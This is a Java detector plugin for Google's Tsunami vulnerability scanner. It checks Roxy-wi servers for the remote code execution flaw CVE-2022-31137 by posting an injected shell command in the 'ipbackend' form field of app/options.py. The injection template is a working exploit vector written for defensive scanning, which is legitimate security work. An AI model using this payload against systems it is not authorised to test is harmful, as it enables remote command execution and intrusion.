/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve202231137;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects Roxy-wi RCE CVE-2022-31137. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Roxy-wi RCE CVE-2022-31137 Detector",
    version = "0.1",
    description = "This detector checks Roxy-wi RCE (CVE-2022-31137)",
    author = "amammad",
    bootstrapModule = Cve202231137DetectorBootstrapModule.class)
public final class Cve202231137Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  @VisibleForTesting static final String VULNERABLE_REQUEST_PATH = "app/options.py";
  private static final String HTTP_PARAMETERS =
      "alert_consumer=1&serv=127.0.0.1&ipbackend=\";%s+##&backend_server=127.0.0.1";

  private final Clock utcClock;
  private final HttpClient httpClient;

  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202231137Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {

    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setTrustAllCertificates(true).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202231137Detector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    return (payloadGenerator.isCallbackServerEnabled() && isVulnerableWithCallback(networkService))
        || isVulnerableWithoutCallback(networkService);
  }

  private boolean isVulnerableWithoutCallback(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();

    HttpResponse response = sendRequest(networkService, String.format(HTTP_PARAMETERS, cmd));
    if (response != null) {
      if (response.bodyString().isEmpty()) {
        return false;
      }
      return payload.checkIfExecuted(response.bodyString().get());
    } else return false;
  }

  private boolean isVulnerableWithCallback(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = payloadGenerator.generate(config);
    String cmd = payload.getPayload();

    sendRequest(networkService, String.format(HTTP_PARAMETERS, cmd));

    return payload.checkIfExecuted();
  }

  private HttpResponse sendRequest(NetworkService networkService, String Payload) {
    HttpHeaders httpHeaders =
        HttpHeaders.builder()
            .addHeader(CONTENT_TYPE, "application/x-www-form-urlencoded; charset=UTF-8")
            .addHeader("X-Requested-With", "XMLHttpRequest")
            .build();

    String targetVulnerabilityUrl =
        buildTarget(networkService).append(VULNERABLE_REQUEST_PATH).toString();
    try {
      return httpClient.send(
          post(targetVulnerabilityUrl)
              .setHeaders(httpHeaders)
              .setRequestBody(ByteString.copyFromUtf8(Payload))
              .build(),
          networkService);
    } catch (IOException | AssertionError e) {
      logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
      return null;
    }
  }

  private static StringBuilder buildTarget(NetworkService networkService) {
    StringBuilder targetUrlBuilder = new StringBuilder();
    if (NetworkServiceUtils.isWebService(networkService)) {
      targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
    } else {
      targetUrlBuilder
          .append("http://")
          .append(toUriAuthority(networkService.getNetworkEndpoint()))
          .append("/");
    }
    return targetUrlBuilder;
  }

  @VisibleForTesting
  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE-2022-31137"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Roxy-wi RCE (CVE-2022-31137)")
                .setDescription(
                    "Roxy-wi Versions prior to 6.1.1.0 are subject to a remote code execution vulnerability."))
        .build();
  }
}
